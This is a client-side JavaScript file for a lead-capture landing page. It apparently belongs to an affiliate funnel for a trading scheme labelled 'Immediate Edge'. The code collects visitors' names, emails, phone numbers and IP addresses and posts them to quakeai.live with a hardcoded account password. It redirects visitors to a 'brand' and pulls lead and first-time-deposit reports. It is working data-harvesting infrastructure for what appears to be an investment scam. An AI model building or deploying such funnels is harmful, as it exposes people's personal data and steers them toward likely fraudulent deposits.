// In-memory database for lead storage
let leadDatabase = {};
let countryCode;

// Country code to ISO map
const countryPhoneToISO = {
  "+64": "NZ",
  "+1": "CA",
  "+61": "AU",
  "+65": "SG",
  "+44": "GB",
  "+353": "IE",
  "+45": "DK",
  "+46": "SE",
  "+358": "FI",
  "+31": "NL",
  "+49": "DE",
  "+43": "AT",
};

// Domain and campaign identifiers (non-sensitive)
const domainName = "quakeai.live";
const apiName = "algo";

// Adding CSS for overlay
const style = document.createElement("style");
style.type = "text/css";
style.innerHTML = `
  .overlay {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.7);
    z-index: 9999;
  }
  .loader {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
  }
  .overlay-message {
    position: absolute;
    top: 60%;
    left: 50%;
    transform: translate(-50%, -50%);
    color: white;
    font-size: 24px;
  }
`;
document.getElementsByTagName("head")[0].appendChild(style);

// Creating overlay and loader elements
const overlay = document.createElement("div");
overlay.className = "overlay";
const loader = document.createElement("div");
loader.className = "loader";
loader.innerHTML = '<img src="loader.gif">';
const message = document.createElement("div");
message.className = "overlay-message";
overlay.appendChild(loader);
overlay.appendChild(message);
document.body.appendChild(overlay);

// Function to fetch the client's IP address from ipify.org
const getClientIP = async () => {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Error fetching client IP:", error);
    return "127.0.0.1";
  }
};

// Function to generate a unique click ID
function generateUniqueClickId() {
  const length = Math.floor(Math.random() * 7) + 9;
  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return `clickid_${result}`;
}

// Event listener for DOM content loaded
document.addEventListener("DOMContentLoaded", async () => {
  const investForm = document.querySelector('[data-id="form"]');

  // Generate or extract ClickID
  const urlParams = new URLSearchParams(window.location.search);
  let clickid = urlParams.get("clickid");
  if (!clickid) {
    clickid = generateUniqueClickId();
    urlParams.set("clickid", clickid);
    window.location.replace(`${window.location.pathname}?${urlParams}`);
    return;
  }

  // Fetching the country code
  try {
    const response = await fetch("https://geinfoinfo.mrtinaixii.workers.dev/");
    countryCode = await response.text();
  } catch (error) {
    console.error("Error fetching country code:", error);
    return;
  }

  // Setting up phone input field
  const phoneInput = document.getElementById("phone");
  if (phoneInput) {
    phoneInput.placeholder = `${countryCode} - Phone Number`;
    phoneInput.value = `${countryCode}-`;
    phoneInput.addEventListener("keydown", function (e) {
      if (this.value.indexOf(`${countryCode}-`) !== 0) {
        this.value = `${countryCode}-`;
      }
    });
  }

  // Form submission event handling
  investForm.addEventListener("submit", async (e) => {
    e.preventDefault();

    overlay.style.display = "block";
    message.innerText = "Registering you on the best brand...";

    // Get the client's IP address
    const clientIP = await getClientIP();

    // Preparing form data for the algo leads API
    // Auth, PartnerID, TrackingID, SubCampaignID are injected server-side by reg_leads.php
    const thirdPartyData = {
      Country: countryPhoneToISO[countryCode],
      LoginEmail: document.getElementById("emailokobo").value,
      LoginPassword: "Gyeu78h1q",
      FirstName: document.getElementById("first_name").value,
      LastName: document.getElementById("last_name").value,
      PhonePrefix: countryCode.replace("+", ""),
      Phone: document
        .getElementById("phone")
        .value.replace(`${countryCode}-`, ""),
      lang: "en-US",
      FunnelID: 600,
      CustomSource: "Immediate Edge",
      Service: "createAccountByOptimizer",
      ClientIP: clientIP,
      ClickID: clickid.replace("clickid_", ""),
    };

    // Send data to algo leads API
    try {
      console.log("Sending data to algo leads API...");
      const response = await fetch(
        `https://${domainName}/${apiName}/reg_leads.php`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(thirdPartyData),
        },
      );

      const result = await response.json();
      console.log("Algo leads API response:", result);

      if (result.status === "Success") {
        const redirectTo = result.data.RedirectTo;
        message.innerText = "Redirecting to the brand...";
        setTimeout(() => {
          window.location.href = redirectTo;
        }, 2000);
      } else {
        message.innerText = "Registration failed. Please try again.";
        console.log("Algo leads API error:", result);
        overlay.style.display = "none";
      }
    } catch (error) {
      console.error("Error sending data to algo leads API:", error);
      message.innerText = "Error during registration.";
      overlay.style.display = "none";
    }
  });

  // Function to fetch and display leads
  async function fetchAndDisplayLeads() {
    try {
      // Auth, Token, PartnerID, TrackingID, SubCampaignID are injected server-side by leads_proxy.php
      const requestData = {
        Service: "AccountsDataBySubCampaign",
        FunnelID: 600,
        CustomSource: "YourFunnelName",
        CreateTimeFrom: "2026-02-02 00:00:01",
        CreateTimeTo: "2026-03-19 00:00:01",
      };

      const response = await fetch(
        "https://quakeai.live/algo/leads_proxy.php",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(requestData),
        },
      );

      const responseData = await response.json();

      if (responseData.status === "Success") {
        console.log("Leads:", responseData.data);
      } else {
        console.error("Failed to fetch leads:", responseData.error);
      }
    } catch (error) {
      console.error("Error fetching leads:", error);
    }
  }

  // Function to fetch and display FTD data
  async function fetchAndDisplayFTDs() {
    try {
      // Auth, Token, PartnerID, TrackingID, SubCampaignID are injected server-side by ftd_proxy.php
      const requestData = {
        Service: "DepositsListBySubCampaign",
        FunnelID: 600,
        CustomSource: "YourFunnelName",
        CreateTimeFrom: "2026-02-02 00:00:01",
        CreateTimeTo: "2026-03-19 00:00:01",
      };

      const response = await fetch("https://quakeai.live/algo/ftd_proxy.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(requestData),
      });

      const responseData = await response.json();

      if (responseData.status === "Success") {
        console.log("FTDs:", responseData.data);
      } else {
        console.error("Failed to fetch FTDs:", responseData.error);
      }
    } catch (error) {
      console.error("Error fetching FTDs:", error);
    }
  }

  // Fetch leads and FTDs on page load
  fetchAndDisplayLeads();
  fetchAndDisplayFTDs();
});
